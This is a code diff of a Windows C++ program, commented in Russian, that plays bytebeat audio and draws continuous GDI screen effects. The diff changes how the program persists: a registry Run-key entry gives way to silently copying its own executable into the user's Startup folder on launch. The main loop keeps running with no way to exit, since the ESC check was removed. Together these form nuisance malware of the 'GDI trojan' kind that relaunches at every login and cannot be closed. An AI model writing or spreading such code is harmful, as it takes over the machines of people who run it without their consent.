@@ -1,9 +1,12 @@
 #include <windows.h>
 #include <mmsystem.h>
+#include <shlobj.h> // Библиотека для работы с системными папками (включая Startup)
 #include <ctime>
 
-// Подключаем библиотеку для работы со звуком
+// Подключаем необходимые системные библиотеки напрямую в коде
 #pragma comment(lib, "winmm.lib")
+#pragma comment(lib, "shell32.lib")
+#pragma comment(lib, "ole32.lib")
 
 // Настройки аудио (классический Bytebeat)
 const int SAMPLE_RATE = 8000; 
@@ -17,23 +20,23 @@ inline BYTE GenerateBytebeat(DWORD t) {
     return static_cast<BYTE>((((t * (t >> 8 | t >> 9) & 46 & t >> 8)) ^ (t & t >> 13 | t >> 6)) & 0xFF);
 }
 
-// Функция для автоматического добавления программы в автозагрузку реестра
-void RegisterMyProgramForStartup() {
-    HKEY hKey = nullptr;
-    // Путь к ветке автозагрузки текущего пользователя
-    const char* czStartName = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
-    // Имя параметра в реестре для вашей программы
-    const char* czValueName = "GdiBytebeatEffects";
+// Функция для копирования файла в папку "Автозагрузка" текущего пользователя
+void CopyProgramToStartupFolder() {
+    char szStartupPath[MAX_PATH];
+    
+    // Получаем путь к папке автозагрузки текущего пользователя (работает на XP, Vista, 7, 10, 11)
+    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, szStartupPath))) {
+        
+        // Получаем полный путь к текущему запущенному exe-файлу
+        char szCurrentProgPath[MAX_PATH];
+        GetModuleFileNameA(NULL, szCurrentProgPath, MAX_PATH);
 
-    // Получаем полный путь к текущему запущенному exe-файлу
-    char szProgPath[MAX_PATH];
-    GetModuleFileNameA(NULL, szProgPath, MAX_PATH);
+        // Формируем имя конечного файла в папке автозагрузки
+        // Например: C:\Users\Имя\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\GdiEffectsApp.exe
+        lstrcatA(szStartupPath, "\\GdiEffectsApp.exe");
 
-    // Открываем раздел реестра с правами на запись
-    if (RegOpenKeyExA(HKEY_CURRENT_USER, czStartName, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
-        // Записываем путь к файлу в реестр
-        RegSetValueExA(hKey, czValueName, 0, REG_SZ, (const BYTE*)szProgPath, lstrlenA(szProgPath) + 1);
-        RegCloseKey(hKey);
+        // Копируем файл. Параметр FALSE означает, что если файл уже существует, он будет перезаписан
+        CopyFileA(szCurrentProgPath, szStartupPath, FALSE);
     }
 }
 
@@ -88,8 +91,8 @@ DWORD WINAPI AudioThreadFunc(LPVOID lpParam) {
 // ГЛАВНЫЙ ПОТОК: Безумная непрерывная графика
 // -------------------------------------------------------------
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
-    // Вызываем функцию добавления в автозагрузку при старте
-    RegisterMyProgramForStartup();
+    // Копируем исполняемый файл в автозагрузку при запуске
+    CopyProgramToStartupFolder();
 
     srand(static_cast<unsigned int>(time(0)));
 
@@ -111,7 +114,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
     HANDLE hAudioThread = CreateThread(NULL, 0, AudioThreadFunc, hWaveOut, 0, NULL);
 
-    // Изменено на истинно бесконечный цикл — проверка GetAsyncKeyState(VK_ESCAPE) полностью удалена
+    // Полностью бесконечный цикл без возможности выхода по ESC
     while (true) {
         DWORD t = globalT; 
         BYTE soundValue = GenerateBytebeat(t);
@@ -136,7 +139,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         Sleep(1); 
     }
 
-    // Этот участок кода теперь недостижим в нормальных условиях
     isRunning = false;
     if (hAudioThread != NULL) {
         WaitForSingleObject(hAudioThread, INFINITE);
